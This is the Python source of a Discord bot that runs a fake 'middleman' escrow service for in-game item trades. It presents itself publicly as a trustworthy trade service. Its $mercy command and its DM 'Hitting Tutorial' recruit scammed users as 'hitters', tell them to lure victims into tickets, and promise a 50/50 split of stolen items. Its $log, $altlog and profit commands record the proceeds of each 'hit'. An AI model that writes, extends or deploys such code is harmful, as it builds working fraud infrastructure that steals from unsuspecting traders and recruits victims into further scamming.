import discord
from discord.ext import commands
import json
import asyncio
import os
import io
from datetime import datetime

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="$", intents=intents)

# =========================
# CONFIG
# =========================
GUILD_ID = 1509986055112233042

CATEGORY_ID   = 1509993737915338802
TRANSCRIPT_CH = 1509993884355268680
TOS_CH        = 1509993970413994054
LOG_CH        = 1509993876742476000

MERCY_ROLE    = 1509993713596895343
HITTER_ROLE   = 1509993713596895343   # role given on mercy accept (update if different)

MM_ROLES = [
    1509993712074096780,
    1509993711285567651,
    1509993710446706708,
    1509993709385683117
]

FOOTER = "Gamivo Marketplace"

# =========================
# STORAGE
# =========================
def load(name):
    if not os.path.exists(name):
        return {}
    with open(name) as f:
        return json.load(f)

def save(name, data):
    with open(name, "w") as f:
        json.dump(data, f, indent=4)

vouches_data = load("vouches.json")
profit_data  = load("profit.json")

TICKETS    = {}
temp_store = {}

# =========================
# HELPERS
# =========================
def is_mm(member):
    return any(r.id in MM_ROLES for r in member.roles)

def mm_ping_str(guild):
    """Returns a mention string for all MM roles that exist."""
    parts = []
    for rid in MM_ROLES:
        r = guild.get_role(rid)
        if r:
            parts.append(r.mention)
    return " ".join(parts)

async def make_transcript(channel):
    lines = []
    async for msg in channel.history(limit=None, oldest_first=True):
        ts = msg.created_at.strftime("%Y-%m-%d %H:%M:%S UTC")
        lines.append(f"[{ts}] {msg.author} ({msg.author.id}): {msg.content}")
        for e in msg.embeds:
            if e.title:       lines.append(f"  [EMBED TITLE] {e.title}")
            if e.description: lines.append(f"  [EMBED DESC]  {e.description}")
            for f in e.fields:
                lines.append(f"  [{f.name}] {f.value}")
    return io.BytesIO("\n".join(lines).encode())

# =========================
# MERCY SYSTEM  (full — from bot_57)
# =========================
class MercyView(discord.ui.View):
    def __init__(self, target=None, author=None):
        super().__init__(timeout=None)
        self.target = target
        self.author = author

    @discord.ui.button(label="Accept", style=discord.ButtonStyle.success, custom_id="v:mercy_accept")
    async def accept(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.target and interaction.user.id != self.target.id:
            return await interaction.response.send_message(
                "❌ Only the targeted user can respond.", ephemeral=True)

        role = interaction.guild.get_role(HITTER_ROLE)
        if role:
            await interaction.user.add_roles(role)

        embed = discord.Embed(
            title="✅ Opportunity Accepted",
            description=f"{interaction.user.mention} has accepted the opportunity and has been verified.",
            color=discord.Color.green()
        )
        embed.set_footer(text=f"{FOOTER} • Today at {discord.utils.utcnow().strftime('%I:%M %p')}")

        for child in self.children:
            child.disabled = True
            if child.label == "Accept":
                child.label = "Accepted"

        await interaction.response.edit_message(embed=embed, view=self)

        # DM tutorial
        dm_embed = discord.Embed(title="💫 Hitting Tutorial", color=0x2b2d31)
        dm_embed.description = (
            "You're a hitter now. A hitter is someone that got scammed by us, "
            "and goes out to scam others. In other words, you're now a scammer."
        )
        dm_embed.add_field(
            name="❓ What should I do?",
            value=(
                "You need to go and advertise trades on other servers. "
                "Once the other trader/victim DMs you, lead the conversation "
                "towards using a middleman. Once they agree, send them our server "
                "and create a ticket. A random middleman will come assist you."
            ), inline=False)
        dm_embed.add_field(
            name="💰 How do I get profit?",
            value="After you hit/scam for an item, you and the Middleman will split the item 50/50.",
            inline=False)
        dm_embed.add_field(
            name="🤔 Can I become a middleman?",
            value="Absolutely, but it does not come free. Check the requirements channel to rank up.",
            inline=False)
        dm_embed.set_footer(text=FOOTER)

        try:
            await interaction.user.send(embed=dm_embed)
        except discord.Forbidden:
            pass

    @discord.ui.button(label="Decline", style=discord.ButtonStyle.danger, custom_id="v:mercy_decline")
    async def decline(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.target and interaction.user.id != self.target.id:
            return await interaction.response.send_message(
                "❌ Only the targeted user can respond.", ephemeral=True)

        embed = discord.Embed(
            title="❌ Opportunity Declined",
            description=f"{interaction.user.mention} has declined the opportunity.",
            color=discord.Color.red()
        )
        embed.set_footer(text=f"{FOOTER} • Today at {discord.utils.utcnow().strftime('%I:%M %p')}")

        for child in self.children:
            child.disabled = True
            if child.label == "Decline":
                child.label = "Declined"

        await interaction.response.edit_message(embed=embed, view=self)


@bot.command()
async def mercy(ctx, user: discord.Member):
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can use this command.", delete_after=5)

    now_str = discord.utils.utcnow().strftime("%I:%M %p")

    scam_embed = discord.Embed(
        title="⚠️ Mercy Offer",
        description=(
            f"{user.mention}, you have been offered **mercy**.\n\n"
            "Respond within **5 minutes** or the offer expires."
        ),
        color=0xed4245
    )
    scam_embed.set_footer(text=f"Offered by {ctx.author} • Today at {now_str}")

    offer_embed = discord.Embed(
        description=(
            f"{user.mention}, do you want to accept this opportunity?\n\n"
            "⏳ **You have 5 minutes to respond. The decision is yours.**"
        ),
        color=0xed4245
    )
    offer_embed.set_footer(text=f"{FOOTER} • Today at {now_str}")

    view = MercyView(target=user, author=ctx.author)

    await ctx.send(embed=scam_embed)
    await ctx.send(embed=offer_embed, view=view)

# =========================
# CLAIM SYSTEM
# =========================
class ClaimView(discord.ui.View):
    def __init__(self, creator_id=None):
        super().__init__(timeout=None)
        self.creator_id = creator_id

    @discord.ui.button(label="Claim", style=discord.ButtonStyle.green, custom_id="v:claim_btn")
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        ch = interaction.channel
        if ch.id not in TICKETS:
            return await interaction.response.send_message("Not a ticket channel.", ephemeral=True)
        if not is_mm(interaction.user):
            return await interaction.response.send_message("Only middlemen can claim tickets.", ephemeral=True)

        data = TICKETS[ch.id]
        if data.get("claimed"):
            claimer = interaction.guild.get_member(data["claimed"])
            name = claimer.mention if claimer else "someone"
            return await interaction.response.send_message(f"Already claimed by {name}.", ephemeral=True)

        data["claimed"] = interaction.user.id

        # Lock to claimer + creator only
        overwrites = {
            interaction.guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),
        }
        creator = interaction.guild.get_member(data["creator"])
        if creator:
            overwrites[creator] = discord.PermissionOverwrite(view_channel=True, send_messages=True)
        for uid in data.get("added", []):
            m = interaction.guild.get_member(uid)
            if m:
                overwrites[m] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        await ch.edit(overwrites=overwrites)

        # Disable the claim button
        button.disabled = True
        button.label = "Claimed"
        await interaction.message.edit(view=self)

        # Send claimed embed + close button
        claimed_embed = discord.Embed(
            title="✅ Ticket Claimed",
            description=f"{interaction.user.mention} will be your Middleman for today.",
            color=0x57f287
        )
        claimed_embed.set_footer(text=f"{FOOTER} • Today at {discord.utils.utcnow().strftime('%I:%M %p')}")

        await interaction.response.defer()
        await ch.send(embed=claimed_embed, view=CloseView())

# =========================
# CLOSE SYSTEM
# =========================
class CloseView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Close", style=discord.ButtonStyle.danger, emoji="🔒", custom_id="v:close_btn")
    async def close(self, interaction: discord.Interaction, button: discord.ui.Button):
        await do_close(interaction)


async def do_close(ctx_or_interaction):
    """Works with both a ctx (command) and an interaction (button)."""
    is_interaction = isinstance(ctx_or_interaction, discord.Interaction)
    ch    = ctx_or_interaction.channel
    guild = ctx_or_interaction.guild
    user  = ctx_or_interaction.user if is_interaction else ctx_or_interaction.author

    if ch.id not in TICKETS:
        msg = "This is not a ticket channel."
        if is_interaction:
            return await ctx_or_interaction.response.send_message(msg, ephemeral=True)
        return await ch.send(msg)

    data = TICKETS[ch.id]

    # Build transcript
    buf = await make_transcript(ch)

    # Send to transcript channel
    tr_ch = guild.get_channel(TRANSCRIPT_CH)
    if tr_ch:
        embed = discord.Embed(
            title=f"📋 Transcript — {ch.name}",
            color=0xfee75c,
            timestamp=datetime.utcnow()
        )
        creator = guild.get_member(data.get("creator"))
        claimer = guild.get_member(data.get("claimed")) if data.get("claimed") else None
        embed.add_field(name="Ticket Creator", value=creator.mention if creator else "Unknown", inline=True)
        embed.add_field(name="Claimed By",     value=claimer.mention if claimer else "Unclaimed", inline=True)
        embed.add_field(name="Closed By",      value=user.mention,    inline=True)
        embed.set_footer(text=FOOTER)
        buf2 = await make_transcript(ch)
        await tr_ch.send(embed=embed, file=discord.File(buf2, filename=f"transcript-{ch.name}.txt"))

    # DM transcript to added users
    for uid in data.get("added", []):
        m = guild.get_member(uid)
        if m:
            try:
                buf3 = await make_transcript(ch)
                await m.send(
                    f"📋 Transcript for `{ch.name}`",
                    file=discord.File(buf3, filename=f"transcript-{ch.name}.txt")
                )
            except:
                pass

    if is_interaction:
        await ctx_or_interaction.response.send_message("🔒 Closing ticket in 5 seconds...")
    else:
        await ch.send("🔒 Closing ticket in 5 seconds...")

    await asyncio.sleep(5)
    TICKETS.pop(ch.id, None)
    await ch.delete()


@bot.command()
async def close(ctx):
    await do_close(ctx)

# =========================
# MODAL
# =========================
class MMModal(discord.ui.Modal, title="Request Middleman"):
    trader = discord.ui.TextInput(
        label="Who are you trading with?",
        placeholder="Their username or @mention",
        required=True
    )
    info = discord.ui.TextInput(
        label="What is the trade info?",
        style=discord.TextStyle.paragraph,
        placeholder="Describe what items/currency are being traded...",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        guild = interaction.guild

        ch = await guild.create_text_channel(
            name=f"ticket-{interaction.user.name}",
            category=guild.get_channel(CATEGORY_ID),
            topic=str(interaction.user.id)
        )

        TICKETS[ch.id] = {
            "creator": interaction.user.id,
            "claimed": None,
            "added":   []
        }

        embed = discord.Embed(
            title="🎫 MM Ticket",
            color=0x2b2d31,
            timestamp=datetime.utcnow()
        )
        embed.add_field(name="Creator",      value=interaction.user.mention, inline=True)
        embed.add_field(name="Trading With", value=self.trader.value,        inline=True)
        embed.add_field(name="Trade Info",   value=self.info.value,          inline=False)
        embed.description = (
            f"{interaction.user.mention}, thank you for using our middleman services.\n\n"
            "Please wait for a middleman to assist you.\n\n"
            "If you have any questions, please let a staff member know."
        )
        embed.set_footer(text=f"{FOOTER} • Today at {discord.utils.utcnow().strftime('%I:%M %p')}")

        # Ping only MM roles, NOT @here
        ping = mm_ping_str(guild) + f" {interaction.user.mention}"

        await ch.send(content=ping, embed=embed, view=ClaimView(creator_id=interaction.user.id))
        await interaction.response.send_message(f"✅ Ticket created: {ch.mention}", ephemeral=True)

# =========================
# PANEL  (matches screenshot)
# =========================
class MMPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Request Middleman", style=discord.ButtonStyle.primary,
                       emoji="🎫", custom_id="v:mm_panel_btn")
    async def mm(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(MMModal())


@bot.command()
async def setup(ctx):
    embed = discord.Embed(
        title="🛡️ Middleman Services",
        color=0x2b2d31
    )
    embed.add_field(
        name="Middleman Service",
        value=(
            "• To request a middleman from this server, click the blue **\"Request Middleman\"** "
            "button on this message."
        ),
        inline=False
    )
    embed.add_field(
        name="How does middleman work?",
        value=(
            "• Example: Trade is Frost Dragon for Corrupt.\n"
            "• Trader #1 gives Frost Dragon to middleman.\n"
            "• Trader #2 gives Corrupt to middleman.\n"
            "• Middleman gives the respective pets to each trader."
        ),
        inline=False
    )
    embed.add_field(
        name="⚠️ DISCLAIMER!",
        value=(
            "You must both agree on the deal before using a middleman. "
            "Troll tickets will have consequences."
        ),
        inline=False
    )
    embed.set_footer(text=f"{FOOTER} • Today at {discord.utils.utcnow().strftime('%I:%M %p')}")
    await ctx.send(embed=embed, view=MMPanel())

# =========================
# CONFIRM SYSTEM  (from bot_57 TradeView)
# =========================
class TradeView(discord.ui.View):
    def __init__(self, t1: int, t2: int, mm: int):
        super().__init__(timeout=None)
        self.t1        = t1
        self.t2        = t2
        self.mm        = mm
        self.confirmed: set = set()

        b1 = discord.ui.Button(
            label="✅ Confirm Trade (Trader 1)",
            style=discord.ButtonStyle.success,
            custom_id=f"trade_t1_{t1}_{t2}"
        )
        b2 = discord.ui.Button(
            label="✅ Confirm Trade (Trader 2)",
            style=discord.ButtonStyle.success,
            custom_id=f"trade_t2_{t1}_{t2}"
        )
        b1.callback = self._confirm_t1
        b2.callback = self._confirm_t2
        self.add_item(b1)
        self.add_item(b2)

    async def _confirm_t1(self, interaction: discord.Interaction):
        if interaction.user.id != self.t1:
            return await interaction.response.send_message("You are not Trader 1.", ephemeral=True)
        self.confirmed.add(self.t1)
        await self._refresh(interaction)

    async def _confirm_t2(self, interaction: discord.Interaction):
        if interaction.user.id != self.t2:
            return await interaction.response.send_message("You are not Trader 2.", ephemeral=True)
        self.confirmed.add(self.t2)
        await self._refresh(interaction)

    async def _refresh(self, interaction: discord.Interaction):
        guild = interaction.guild
        m1  = guild.get_member(self.t1)
        m2  = guild.get_member(self.t2)
        mm  = guild.get_member(self.mm)
        t1c = self.t1 in self.confirmed
        t2c = self.t2 in self.confirmed
        old = interaction.message.embeds[0]
        details = old.fields[0].value if old.fields else "—"

        if t1c and t2c:
            embed = discord.Embed(color=0x57f287, title="✅ Trade Confirmed")
            embed.description = "Both traders have confirmed. Please proceed with the rest of the trade."
            embed.add_field(name="🔵 Trader 1",  value=m1.mention if m1 else str(self.t1), inline=True)
            embed.add_field(name="🔵 Trader 2",  value=m2.mention if m2 else str(self.t2), inline=True)
            embed.add_field(name="🛡️ Middleman", value=mm.mention if mm else str(self.mm), inline=False)
            embed.add_field(name="✅ Status",     value="Both traders confirmed",           inline=False)
            embed.set_footer(text=FOOTER)
            for item in self.children:
                item.disabled = True
                item.label    = "Trade Confirmed"
        else:
            t1d = "🟢" if t1c else "🔴"
            t2d = "🟢" if t2c else "🔴"
            embed = discord.Embed(color=0x2b2d31, title="✅ Trade Confirmation")
            embed.description = "In order to continue this trade, both traders should confirm the trade."
            embed.add_field(name="📊 Trade Information", value=details, inline=False)
            embed.add_field(name="🔵 Trader 1",  value=m1.mention if m1 else str(self.t1), inline=True)
            embed.add_field(name="🔵 Trader 2",  value=m2.mention if m2 else str(self.t2), inline=True)
            embed.add_field(name="🛡️ Middleman", value=mm.mention if mm else str(self.mm), inline=False)
            embed.add_field(
                name="⏳ Awaiting Confirmation",
                value=f"{t1d} {m1.mention if m1 else str(self.t1)}\n{t2d} {m2.mention if m2 else str(self.t2)}",
                inline=False
            )
            embed.set_footer(text=FOOTER)
            for item in self.children:
                if "t1" in item.custom_id and t1c:
                    item.label, item.disabled = "Confirmed (Trader 1)", True
                if "t2" in item.custom_id and t2c:
                    item.label, item.disabled = "Confirmed (Trader 2)", True

        await interaction.message.edit(embed=embed, view=self)
        await interaction.response.defer()


@bot.command()
async def confirm(ctx, trader1: discord.Member, trader2: discord.Member, *, details: str = "No details provided."):
    """Usage: $confirm @trader1 @trader2 <trade details>"""
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can start a confirmation.")

    view  = TradeView(t1=trader1.id, t2=trader2.id, mm=ctx.author.id)
    embed = discord.Embed(color=0x2b2d31, title="✅ Trade Confirmation")
    embed.description = "In order to continue this trade, both traders should confirm the trade."
    embed.add_field(name="📊 Trade Information", value=details,          inline=False)
    embed.add_field(name="🔵 Trader 1",          value=trader1.mention,  inline=True)
    embed.add_field(name="🔵 Trader 2",          value=trader2.mention,  inline=True)
    embed.add_field(name="🛡️ Middleman",         value=ctx.author.mention, inline=False)
    embed.add_field(
        name="⏳ Awaiting Confirmation",
        value=f"🔴 {trader1.mention}\n🔴 {trader2.mention}",
        inline=False
    )
    embed.set_footer(text=FOOTER)
    await ctx.send(content=f"{trader1.mention} {trader2.mention}", embed=embed, view=view)

# =========================
# ADD / REMOVE USERS
# =========================
@bot.command()
async def add(ctx, user: discord.Member):
    if ctx.channel.id not in TICKETS:
        return await ctx.send("This is not a ticket channel.")
    TICKETS[ctx.channel.id]["added"].append(user.id)
    await ctx.channel.set_permissions(user, view_channel=True, send_messages=True)
    embed = discord.Embed(description=f"✅ {user.mention} has been added to the ticket.", color=0x57f287)
    await ctx.send(embed=embed)

@bot.command()
async def remove(ctx, user: discord.Member):
    if ctx.channel.id not in TICKETS:
        return await ctx.send("This is not a ticket channel.")
    if user.id in TICKETS[ctx.channel.id]["added"]:
        TICKETS[ctx.channel.id]["added"].remove(user.id)
    await ctx.channel.set_permissions(user, overwrite=None)
    embed = discord.Embed(description=f"❌ {user.mention} has been removed from the ticket.", color=0xed4245)
    await ctx.send(embed=embed)

# =========================
# CLAIM / UNCLAIM COMMANDS
# =========================
@bot.command()
async def claim(ctx):
    if ctx.channel.id not in TICKETS:
        return await ctx.send("This is not a ticket channel.")
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can claim tickets.")
    data = TICKETS[ctx.channel.id]
    if data.get("claimed"):
        return await ctx.send("This ticket is already claimed.")
    data["claimed"] = ctx.author.id
    embed = discord.Embed(description=f"✅ Ticket claimed by {ctx.author.mention}", color=0x57f287)
    await ctx.send(embed=embed, view=CloseView())

@bot.command()
async def unclaim(ctx):
    if ctx.channel.id not in TICKETS:
        return await ctx.send("This is not a ticket channel.")
    TICKETS[ctx.channel.id]["claimed"] = None
    embed = discord.Embed(description="🔓 Ticket has been unclaimed.", color=0xfee75c)
    await ctx.send(embed=embed)

# =========================
# VOUCH SYSTEM
# =========================
@bot.command()
async def addvouch(ctx, user: discord.Member, amt: int = 1):
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can add vouches.")
    uid = str(user.id)
    vouches_data[uid] = vouches_data.get(uid, 0) + amt
    save("vouches.json", vouches_data)
    embed = discord.Embed(
        description=f"✅ Added **{amt}** vouch(es) to {user.mention}. Total: **{vouches_data[uid]}**",
        color=0x57f287
    )
    await ctx.send(embed=embed)

@bot.command()
async def removevouch(ctx, user: discord.Member, amt: int = 1):
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can remove vouches.")
    uid = str(user.id)
    vouches_data[uid] = max(0, vouches_data.get(uid, 0) - amt)
    save("vouches.json", vouches_data)
    embed = discord.Embed(
        description=f"✅ Removed **{amt}** vouch(es) from {user.mention}. Total: **{vouches_data[uid]}**",
        color=0xed4245
    )
    await ctx.send(embed=embed)

@bot.command(name="vouches")
async def check_vouches(ctx, user: discord.Member = None):
    target = user or ctx.author
    uid    = str(target.id)
    count  = vouches_data.get(uid, 0)
    embed  = discord.Embed(
        title=f"Vouches — {target.display_name}",
        description=f"{target.mention} has **{count}** vouch(es).",
        color=0x5865f2
    )
    await ctx.send(embed=embed)

# =========================
# PROFIT / LOG SYSTEM
# =========================
async def send_log(ctx, mm: discord.Member, hitter: discord.Member, hit_info: str, split: str):
    uid = str(mm.id)
    try:
        split_num = int(split.replace(",", "").replace("$", "").strip())
        profit_data[uid] = profit_data.get(uid, 0) + split_num
        save("profit.json", profit_data)
        total_str = f"{profit_data[uid]:,}"
    except ValueError:
        total_str = "N/A"

    log_channel = ctx.guild.get_channel(LOG_CH)
    if not log_channel:
        return await ctx.send("⚠️ Log channel not found.")

    embed = discord.Embed(title="💰 Trade Log", color=0x57f287, timestamp=datetime.utcnow())
    embed.add_field(name="Middleman", value=mm.mention,     inline=True)
    embed.add_field(name="Hitter",    value=hitter.mention, inline=True)
    embed.add_field(name="\u200b",    value="\u200b",        inline=True)
    embed.add_field(name="Hit Info",  value=hit_info,        inline=False)
    embed.add_field(name="Split",     value=split,           inline=True)
    embed.add_field(name="MM Total",  value=total_str,       inline=True)
    embed.set_footer(text=f"Logged by {ctx.author} • {ctx.author.id}")

    await log_channel.send(embed=embed)
    await ctx.message.add_reaction("✅")

@bot.command(name="log")
async def log_cmd(ctx, hitter: discord.Member, *, rest: str):
    """Usage: $log @hitter <hit info> | <split>"""
    if "|" not in rest:
        return await ctx.send("Usage: `$log @hitter <hit info> | <split>`")
    hit_info, split = [x.strip() for x in rest.split("|", 1)]
    await send_log(ctx, ctx.author, hitter, hit_info, split)

@bot.command(name="altlog")
async def altlog_cmd(ctx, mm: discord.Member, hitter: discord.Member, *, rest: str):
    """Usage: $altlog @mm @hitter <hit info> | <split>"""
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can use altlog.")
    if "|" not in rest:
        return await ctx.send("Usage: `$altlog @mm @hitter <hit info> | <split>`")
    hit_info, split = [x.strip() for x in rest.split("|", 1)]
    await send_log(ctx, mm, hitter, hit_info, split)

@bot.command()
async def checkprofit(ctx, user: discord.Member = None):
    target = user or ctx.author
    uid    = str(target.id)
    amount = profit_data.get(uid, 0)
    embed  = discord.Embed(
        title="Profit",
        description=f"{target.mention} has logged **{amount:,}** in profit.",
        color=0x57f287
    )
    await ctx.send(embed=embed)

# =========================
# TRANSFER
# =========================
@bot.command()
async def transfer(ctx, user: discord.Member, amount: int):
    if not is_mm(ctx.author):
        return await ctx.send("Only middlemen can transfer profit.")
    sender_id   = str(ctx.author.id)
    receiver_id = str(user.id)
    if profit_data.get(sender_id, 0) < amount:
        return await ctx.send("Insufficient balance.")
    profit_data[sender_id]   = profit_data.get(sender_id, 0) - amount
    profit_data[receiver_id] = profit_data.get(receiver_id, 0) + amount
    save("profit.json", profit_data)
    embed = discord.Embed(
        description=f"💸 Transferred **{amount:,}** from {ctx.author.mention} to {user.mention}.",
        color=0x57f287
    )
    await ctx.send(embed=embed)

# =========================
# ROLE SYSTEM
# =========================
@bot.command()
async def role(ctx, user: discord.Member, *, r: discord.Role):
    if not is_mm(ctx.author):
        return await ctx.send("You don't have permission.")
    await user.add_roles(r)
    embed = discord.Embed(description=f"✅ Gave {r.mention} to {user.mention}.", color=0x57f287)
    await ctx.send(embed=embed)

# =========================
# TEMP SYSTEM
# =========================
@bot.command()
async def temp(ctx):
    m = ctx.author
    if m.id in temp_store:
        for r in temp_store.pop(m.id):
            try:
                await m.add_roles(r)
            except:
                pass
        embed = discord.Embed(description="✅ MM roles restored.", color=0x57f287)
        return await ctx.send(embed=embed)

    removed = [r for r in m.roles if r.id in MM_ROLES]
    temp_store[m.id] = removed
    for r in removed:
        try:
            await m.remove_roles(r)
        except:
            pass
    mercy_role = ctx.guild.get_role(MERCY_ROLE)
    if mercy_role:
        await m.add_roles(mercy_role)
    embed = discord.Embed(
        description="✅ MM roles temporarily removed. Run `$temp` again to restore.",
        color=0xfee75c
    )
    await ctx.send(embed=embed)

# =========================
# TOS
# =========================
@bot.command()
async def tos(ctx):
    ch  = ctx.guild.get_channel(TOS_CH)
    ref = ch.mention if ch else "the TOS channel"
    embed = discord.Embed(
        title="📜 Terms of Service",
        description=f"Please read our full TOS in {ref}.",
        color=0x5865f2
    )
    await ctx.send(embed=embed)

# =========================
# READY
# =========================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    bot.add_view(ClaimView())
    bot.add_view(CloseView())
    bot.add_view(MMPanel())
    bot.add_view(MercyView())

bot.run(os.getenv("DISCORD_TOKEN"))
